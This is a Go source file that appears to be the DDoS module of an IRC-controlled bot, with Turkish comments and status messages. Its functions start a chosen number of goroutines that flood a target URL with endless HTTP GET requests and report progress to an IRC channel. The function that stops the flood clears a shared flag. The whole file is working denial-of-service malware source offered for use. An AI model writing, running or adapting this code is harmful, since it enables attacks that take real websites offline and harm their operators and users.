package main

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/thoj/go-ircevent"
)

var ddosStatus = false
var getReqSent = 0

//DDOSStart DDoS Saldırısı başlatma
func DDOSStart(url string, threadNum int, ircConnection *irc.Connection) {
	if strings.HasPrefix(url, "http") {
		ircConnection.Privmsg(channel, fmt.Sprintf("%d Çekirdek ile %s sitesine DDoS Başlatılıyor!", threadNum, url))
		ddosStatus = true
		for i := 0; i != threadNum; i++ {
			go GenerateDDOSThread(url, ircConnection)
		}
	}
}

//GenerateDDOSThread GO için thread
func GenerateDDOSThread(url string, ircConnection *irc.Connection) {
	fails := 0
	for ddosStatus == true {
		resp, err := http.Get(url)
		if err == nil && resp != nil {
			getReqSent = getReqSent + 1
		} else {
			if fails == 10 {
				ircConnection.Privmsg(channel, fmt.Sprintf("10 Deneme Sonra DDoS Durduruldu! Hata: %s", err))
				getReqSent = 0
			} else {
				time.Sleep((1000) * 120)
			}
		}
	}
}

//DDOSStop DDoS Saldırısını durdurma
func DDOSStop(ircConnection *irc.Connection) {
	ircConnection.Privmsg(channel, "DDoS Durduruldu!")
	ddosStatus = false
	getReqSent = 0
}
